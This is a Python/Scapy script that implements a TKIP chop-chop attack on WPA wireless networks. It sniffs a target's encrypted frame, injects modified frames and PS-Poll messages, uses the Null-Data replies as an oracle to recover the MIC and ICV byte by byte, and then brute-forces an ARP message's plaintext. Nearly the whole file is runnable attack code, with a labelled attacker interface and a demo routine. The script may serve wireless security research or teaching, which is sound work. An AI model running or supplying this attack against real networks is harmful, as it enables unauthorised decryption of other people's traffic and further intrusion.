#!/usr/bin/python
from scapy.layers.all import RadioTap,Dot11,Dot11QoS,LLC,SNAP,ARP
from scapy.config import conf
from scapy.data import ETH_P_ALL
from scapy.sendrecv import sniff
from binascii import hexlify,crc32

# Defaults.
IFACE		= "wlan2"		# Attacker Interface in Monitor Mode.
BROADCAST	= "ff:ff:ff:ff:ff:ff"	# MAC Address for Broadcasting.
BSSID		= "02:00:00:00:00:00"	# MAC Address of the Access Point.
TARGET		= "02:00:00:00:01:00"	# MAC Address of the Target.
TARGET_IP	= '192.168.0.10'	# IP Address of the Target.
NUM_BYTES 	= 12			# MIC (8) + ICV (4)
TIMEOUT		= 0.05

# Source: https://github.com/aircrack-ng/aircrack-ng/blob/master/src/crctable.h
crc_chop_tbl = [
	[0x26,0x70,0x6A,0x0F],[0x67,0x76,0x1B,0xD4],
	[0xE5,0x7A,0xF9,0x62],[0xA4,0x7C,0x88,0xB9],
	[0xA0,0x65,0x4C,0xD4],[0xE1,0x63,0x3D,0x0F],
	[0x63,0x6F,0xDF,0xB9],[0x22,0x69,0xAE,0x62],
	[0x6B,0x5D,0x57,0x62],[0x2A,0x5B,0x26,0xB9],
	[0xA8,0x57,0xC4,0x0F],[0xE9,0x51,0xB5,0xD4],
	[0xED,0x48,0x71,0xB9],[0xAC,0x4E,0x00,0x62],
	[0x2E,0x42,0xE2,0xD4],[0x6F,0x44,0x93,0x0F],
	[0xBC,0x2A,0x10,0xD5],[0xFD,0x2C,0x61,0x0E],
	[0x7F,0x20,0x83,0xB8],[0x3E,0x26,0xF2,0x63],
	[0x3A,0x3F,0x36,0x0E],[0x7B,0x39,0x47,0xD5],
	[0xF9,0x35,0xA5,0x63],[0xB8,0x33,0xD4,0xB8],
	[0xF1,0x07,0x2D,0xB8],[0xB0,0x01,0x5C,0x63],
	[0x32,0x0D,0xBE,0xD5],[0x73,0x0B,0xCF,0x0E],
	[0x77,0x12,0x0B,0x63],[0x36,0x14,0x7A,0xB8],
	[0xB4,0x18,0x98,0x0E],[0xF5,0x1E,0xE9,0xD5],
	[0x53,0xC3,0xEF,0x60],[0x12,0xC5,0x9E,0xBB],
	[0x90,0xC9,0x7C,0x0D],[0xD1,0xCF,0x0D,0xD6],
	[0xD5,0xD6,0xC9,0xBB],[0x94,0xD0,0xB8,0x60],
	[0x16,0xDC,0x5A,0xD6],[0x57,0xDA,0x2B,0x0D],
	[0x1E,0xEE,0xD2,0x0D],[0x5F,0xE8,0xA3,0xD6],
	[0xDD,0xE4,0x41,0x60],[0x9C,0xE2,0x30,0xBB],
	[0x98,0xFB,0xF4,0xD6],[0xD9,0xFD,0x85,0x0D],
	[0x5B,0xF1,0x67,0xBB],[0x1A,0xF7,0x16,0x60],
	[0xC9,0x99,0x95,0xBA],[0x88,0x9F,0xE4,0x61],
	[0x0A,0x93,0x06,0xD7],[0x4B,0x95,0x77,0x0C],
	[0x4F,0x8C,0xB3,0x61],[0x0E,0x8A,0xC2,0xBA],
	[0x8C,0x86,0x20,0x0C],[0xCD,0x80,0x51,0xD7],
	[0x84,0xB4,0xA8,0xD7],[0xC5,0xB2,0xD9,0x0C],
	[0x47,0xBE,0x3B,0xBA],[0x06,0xB8,0x4A,0x61],
	[0x02,0xA1,0x8E,0x0C],[0x43,0xA7,0xFF,0xD7],
	[0xC1,0xAB,0x1D,0x61],[0x80,0xAD,0x6C,0xBA],
	[0xCC,0x16,0x61,0xD0],[0x8D,0x10,0x10,0x0B],
	[0x0F,0x1C,0xF2,0xBD],[0x4E,0x1A,0x83,0x66],
	[0x4A,0x03,0x47,0x0B],[0x0B,0x05,0x36,0xD0],
	[0x89,0x09,0xD4,0x66],[0xC8,0x0F,0xA5,0xBD],
	[0x81,0x3B,0x5C,0xBD],[0xC0,0x3D,0x2D,0x66],
	[0x42,0x31,0xCF,0xD0],[0x03,0x37,0xBE,0x0B],
	[0x07,0x2E,0x7A,0x66],[0x46,0x28,0x0B,0xBD],
	[0xC4,0x24,0xE9,0x0B],[0x85,0x22,0x98,0xD0],
	[0x56,0x4C,0x1B,0x0A],[0x17,0x4A,0x6A,0xD1],
	[0x95,0x46,0x88,0x67],[0xD4,0x40,0xF9,0xBC],
	[0xD0,0x59,0x3D,0xD1],[0x91,0x5F,0x4C,0x0A],
	[0x13,0x53,0xAE,0xBC],[0x52,0x55,0xDF,0x67],
	[0x1B,0x61,0x26,0x67],[0x5A,0x67,0x57,0xBC],
	[0xD8,0x6B,0xB5,0x0A],[0x99,0x6D,0xC4,0xD1],
	[0x9D,0x74,0x00,0xBC],[0xDC,0x72,0x71,0x67],
	[0x5E,0x7E,0x93,0xD1],[0x1F,0x78,0xE2,0x0A],
	[0xB9,0xA5,0xE4,0xBF],[0xF8,0xA3,0x95,0x64],
	[0x7A,0xAF,0x77,0xD2],[0x3B,0xA9,0x06,0x09],
	[0x3F,0xB0,0xC2,0x64],[0x7E,0xB6,0xB3,0xBF],
	[0xFC,0xBA,0x51,0x09],[0xBD,0xBC,0x20,0xD2],
	[0xF4,0x88,0xD9,0xD2],[0xB5,0x8E,0xA8,0x09],
	[0x37,0x82,0x4A,0xBF],[0x76,0x84,0x3B,0x64],
	[0x72,0x9D,0xFF,0x09],[0x33,0x9B,0x8E,0xD2],
	[0xB1,0x97,0x6C,0x64],[0xF0,0x91,0x1D,0xBF],
	[0x23,0xFF,0x9E,0x65],[0x62,0xF9,0xEF,0xBE],
	[0xE0,0xF5,0x0D,0x08],[0xA1,0xF3,0x7C,0xD3],
	[0xA5,0xEA,0xB8,0xBE],[0xE4,0xEC,0xC9,0x65],
	[0x66,0xE0,0x2B,0xD3],[0x27,0xE6,0x5A,0x08],
	[0x6E,0xD2,0xA3,0x08],[0x2F,0xD4,0xD2,0xD3],
	[0xAD,0xD8,0x30,0x65],[0xEC,0xDE,0x41,0xBE],
	[0xE8,0xC7,0x85,0xD3],[0xA9,0xC1,0xF4,0x08],
	[0x2B,0xCD,0x16,0xBE],[0x6A,0xCB,0x67,0x65],
	[0xB3,0xBB,0x0D,0x6A],[0xF2,0xBD,0x7C,0xB1],
	[0x70,0xB1,0x9E,0x07],[0x31,0xB7,0xEF,0xDC],
	[0x35,0xAE,0x2B,0xB1],[0x74,0xA8,0x5A,0x6A],
	[0xF6,0xA4,0xB8,0xDC],[0xB7,0xA2,0xC9,0x07],
	[0xFE,0x96,0x30,0x07],[0xBF,0x90,0x41,0xDC],
	[0x3D,0x9C,0xA3,0x6A],[0x7C,0x9A,0xD2,0xB1],
	[0x78,0x83,0x16,0xDC],[0x39,0x85,0x67,0x07],
	[0xBB,0x89,0x85,0xB1],[0xFA,0x8F,0xF4,0x6A],
	[0x29,0xE1,0x77,0xB0],[0x68,0xE7,0x06,0x6B],
	[0xEA,0xEB,0xE4,0xDD],[0xAB,0xED,0x95,0x06],
	[0xAF,0xF4,0x51,0x6B],[0xEE,0xF2,0x20,0xB0],
	[0x6C,0xFE,0xC2,0x06],[0x2D,0xF8,0xB3,0xDD],
	[0x64,0xCC,0x4A,0xDD],[0x25,0xCA,0x3B,0x06],
	[0xA7,0xC6,0xD9,0xB0],[0xE6,0xC0,0xA8,0x6B],
	[0xE2,0xD9,0x6C,0x06],[0xA3,0xDF,0x1D,0xDD],
	[0x21,0xD3,0xFF,0x6B],[0x60,0xD5,0x8E,0xB0],
	[0xC6,0x08,0x88,0x05],[0x87,0x0E,0xF9,0xDE],
	[0x05,0x02,0x1B,0x68],[0x44,0x04,0x6A,0xB3],
	[0x40,0x1D,0xAE,0xDE],[0x01,0x1B,0xDF,0x05],
	[0x83,0x17,0x3D,0xB3],[0xC2,0x11,0x4C,0x68],
	[0x8B,0x25,0xB5,0x68],[0xCA,0x23,0xC4,0xB3],
	[0x48,0x2F,0x26,0x05],[0x09,0x29,0x57,0xDE],
	[0x0D,0x30,0x93,0xB3],[0x4C,0x36,0xE2,0x68],
	[0xCE,0x3A,0x00,0xDE],[0x8F,0x3C,0x71,0x05],
	[0x5C,0x52,0xF2,0xDF],[0x1D,0x54,0x83,0x04],
	[0x9F,0x58,0x61,0xB2],[0xDE,0x5E,0x10,0x69],
	[0xDA,0x47,0xD4,0x04],[0x9B,0x41,0xA5,0xDF],
	[0x19,0x4D,0x47,0x69],[0x58,0x4B,0x36,0xB2],
	[0x11,0x7F,0xCF,0xB2],[0x50,0x79,0xBE,0x69],
	[0xD2,0x75,0x5C,0xDF],[0x93,0x73,0x2D,0x04],
	[0x97,0x6A,0xE9,0x69],[0xD6,0x6C,0x98,0xB2],
	[0x54,0x60,0x7A,0x04],[0x15,0x66,0x0B,0xDF],
	[0x59,0xDD,0x06,0xB5],[0x18,0xDB,0x77,0x6E],
	[0x9A,0xD7,0x95,0xD8],[0xDB,0xD1,0xE4,0x03],
	[0xDF,0xC8,0x20,0x6E],[0x9E,0xCE,0x51,0xB5],
	[0x1C,0xC2,0xB3,0x03],[0x5D,0xC4,0xC2,0xD8],
	[0x14,0xF0,0x3B,0xD8],[0x55,0xF6,0x4A,0x03],
	[0xD7,0xFA,0xA8,0xB5],[0x96,0xFC,0xD9,0x6E],
	[0x92,0xE5,0x1D,0x03],[0xD3,0xE3,0x6C,0xD8],
	[0x51,0xEF,0x8E,0x6E],[0x10,0xE9,0xFF,0xB5],
	[0xC3,0x87,0x7C,0x6F],[0x82,0x81,0x0D,0xB4],
	[0x00,0x8D,0xEF,0x02],[0x41,0x8B,0x9E,0xD9],
	[0x45,0x92,0x5A,0xB4],[0x04,0x94,0x2B,0x6F],
	[0x86,0x98,0xC9,0xD9],[0xC7,0x9E,0xB8,0x02],
	[0x8E,0xAA,0x41,0x02],[0xCF,0xAC,0x30,0xD9],
	[0x4D,0xA0,0xD2,0x6F],[0x0C,0xA6,0xA3,0xB4],
	[0x08,0xBF,0x67,0xD9],[0x49,0xB9,0x16,0x02],
	[0xCB,0xB5,0xF4,0xB4],[0x8A,0xB3,0x85,0x6F],
	[0x2C,0x6E,0x83,0xDA],[0x6D,0x68,0xF2,0x01],
	[0xEF,0x64,0x10,0xB7],[0xAE,0x62,0x61,0x6C],
	[0xAA,0x7B,0xA5,0x01],[0xEB,0x7D,0xD4,0xDA],
	[0x69,0x71,0x36,0x6C],[0x28,0x77,0x47,0xB7],
	[0x61,0x43,0xBE,0xB7],[0x20,0x45,0xCF,0x6C],
	[0xA2,0x49,0x2D,0xDA],[0xE3,0x4F,0x5C,0x01],
	[0xE7,0x56,0x98,0x6C],[0xA6,0x50,0xE9,0xB7],
	[0x24,0x5C,0x0B,0x01],[0x65,0x5A,0x7A,0xDA],
	[0xB6,0x34,0xF9,0x00],[0xF7,0x32,0x88,0xDB],
	[0x75,0x3E,0x6A,0x6D],[0x34,0x38,0x1B,0xB6],
	[0x30,0x21,0xDF,0xDB],[0x71,0x27,0xAE,0x00],
	[0xF3,0x2B,0x4C,0xB6],[0xB2,0x2D,0x3D,0x6D],
	[0xFB,0x19,0xC4,0x6D],[0xBA,0x1F,0xB5,0xB6],
	[0x38,0x13,0x57,0x00],[0x79,0x15,0x26,0xDB],
	[0x7D,0x0C,0xE2,0xB6],[0x3C,0x0A,0x93,0x6D],
	[0xBE,0x06,0x71,0xDB],[0xFF,0x00,0x00,0x00]]

##########################################################################################
def isNullData( packet ):
	# Has to contain Dot11.
	if not Dot11 in packet: return False
	# Has to be Type 2=Data, and Subtype 4=Null or 12=QoS Null.
	if packet[Dot11].type != 2: return False
	if packet[Dot11].subtype != 4 and packet[Dot11].subtype != 12: return False
	# Has to be from AP to Target.
	if packet[Dot11].FCfield & 0x02 != 0x02: return False # The from-DS bit.
	if packet[Dot11].addr1 != TARGET: return False
	if packet[Dot11].addr2 != BSSID: return False
	if packet[Dot11].addr3 != BSSID: return False
	return True

##########################################################################################
def isTKIP( packet ):
	# Has to contain Dot11.
	if not Dot11 in packet: return False
	# Has to be Type 2=Data.
	if packet[Dot11].type != 2: return False
	# Has to be from Target to AP.
	if packet[Dot11].FCfield & 0x01 != 0x01: return False # The to-DS bit.
	if packet[Dot11].addr1 != BSSID: return False
	if packet[Dot11].addr2 != TARGET: return False
	# Has to have Protected bit.
	if packet[Dot11].FCfield & 0x40 != 0x40: return False
	return True

##########################################################################################
def modifyTKIP( packet ):
	assert( packet.haslayer(Dot11) and packet.haslayer(Dot11QoS) )
	# Set the Power Management bit.
	packet[Dot11].FCfield |= 0x10
	# Set the fragment number to one.
	packet[Dot11].SC |= 0x01
	# Set the Quality of Service (QoS) bit.
	packet[Dot11QoS].TID = 1 # Traffic Identifier (TID)
	return packet

##########################################################################################
def getPSPoll():
	# Power Save Poll (PS-Poll).
	return Dot11( type="Control" , subtype=10 , addr1=BSSID , addr2=TARGET )

##########################################################################################
def getWakeup():
	# Empty Dot11QoS.
	return Dot11( type="Data" , FCfield="to-DS" , addr1=BSSID , addr2=TARGET , \
		addr3=BSSID )/Dot11QoS()

##########################################################################################
def verify_guess( sock , message , tries = 1 ):

	# Verify the guess tries-number of times to increase robustness.
	for attempt in range(tries):
		
		# Inject the message, followed by a PS-Poll Message.
		sock.send( RadioTap()/message )
		sock.send( RadioTap()/getPSPoll() )

		# Attempt to capture a Null-Data Message.
		# If we have no results, it is a bad guess.
		l = sniff( lfilter=isNullData , count=1 , timeout=TIMEOUT , \
			opened_socket=sock )
		if len(l) <= 0:
			return False

		# We went to sleep so let us wake up again.
		sock.send( RadioTap()/getWakeup() )

	# We always got a PS-Poll, this must be a good guess.
	return True

##########################################################################################
def chopchop( sock , packet ):
	assert( sock is not None )
	assert( packet is not None and isTKIP(packet) is True )

	# Modify the packet, and convert it into byte list.
	packet = modifyTKIP( packet )
	original = data = [ord(x) for x in str(packet.getlayer(Dot11))]
	decrypted = []

	# Chop off a certain number of bytes.
	num_decrypted = 0
	while num_decrypted != NUM_BYTES:

		# Make a guess for every possible value of the chopped off byte (2^8=256).
		found = False
		for guess in xrange(256):

			# Generate a new ICV-value.
			chopped = data[:-1]
			chopped[-1] ^= crc_chop_tbl[guess][3]
			chopped[-2] ^= crc_chop_tbl[guess][2]
			chopped[-3] ^= crc_chop_tbl[guess][1]
			chopped[-4] ^= crc_chop_tbl[guess][0]

			# Construct modified TKIP Message.
			message = ''.join([chr(x) for x in chopped])

			# See if the guess is correct
			if verify_guess( sock , message , tries=2 ):
				byte = original[-num_decrypted-1] ^ data[-1] ^ guess
				print "[+] Received a Null Data Frame for guess",
				print "{:>3} (Plaintext {}).".format( guess , hex(byte) )
				decrypted.append( byte )
				data = chopped
				found = True
				break

		# Make sure that we successfully decrypted a byte.
		if not found:
			print "[-] Failed to decrypt byte..."
			exit()
		num_decrypted += 1

	# Return the MIC and ICV.
	decrypted.reverse()
	return decrypted[-12:-4] , decrypted[-4:]

##########################################################################################
def decryptARP( mic , icv ):
	assert( mic is not None and icv is not None )

	# Reconstruct the ARP Message to the best of our knowledge.
	llc	= LLC( dsap=0xaa , ssap=0xaa , ctrl=0x03 )
	snap	= SNAP( OUI=0x000000 , code=0x0806 )
	arp	= ARP( op='who-has' , hwsrc=TARGET , hwdst=BROADCAST , psrc=TARGET_IP )
	icv.reverse()
	icv 	= "0x" + hexlify(''.join([chr(x) for x in icv]))
	ip 	= [str(x) for x in TARGET_IP.split('.')]

	# Guess for all values of a byte (2^8=256).
	for guess in xrange(256) :

		# Make a guess for the destination IP Address in an /24 range.
		arp.pdst = '.'.join( [ ip[0] , ip[1] , ip[2] , str(guess) ] )
		packet = llc/snap/arp
		data = [ord(x) for x in str(packet)] + mic

		# Calculate the CRC-32 and compare it with the decrypted ICV.
		crc = crc32(''.join([chr(x) for x in data]))
		if hex(crc & 0xffffffff) == icv:
			print "[+] Recovered the plaintext of the ARP Message for guess",
			print "#{}.".format( guess )
			return packet

	# Failed.
	print "[-] Failed to recover the plaintext of the ARP Message."
	return None

##########################################################################################
def demo():

	# Capture a TKIP Frame.
	print "[+] Capturing a TKIP Frame..."
	sock = conf.L2socket( type=ETH_P_ALL , iface=IFACE )
	l = sniff( lfilter=isTKIP , count=1 , timeout=120 , opened_socket=sock )
	if len(l) <= 0:
		print "[-] Failed to capture a TKIP Frame."
		exit()
	packet = l[0].getlayer(Dot11)
	print "[+]", packet.summary()

	# Perform the chop-chop attack, and recover the plaintext of an ARP Message.
	mic , icv = chopchop( sock=sock , packet=packet )
	plaintext = decryptARP( mic=mic , icv=icv )

	# Show the results.
	if plaintext is not None:
		plaintext.show()

##########################################################################################
if __name__ == "__main__":
	print "[+] Sniffing for Target {} and BSSID {}".format( TARGET , BSSID ),
	print "on Interface {}.".format( IFACE )
	demo()
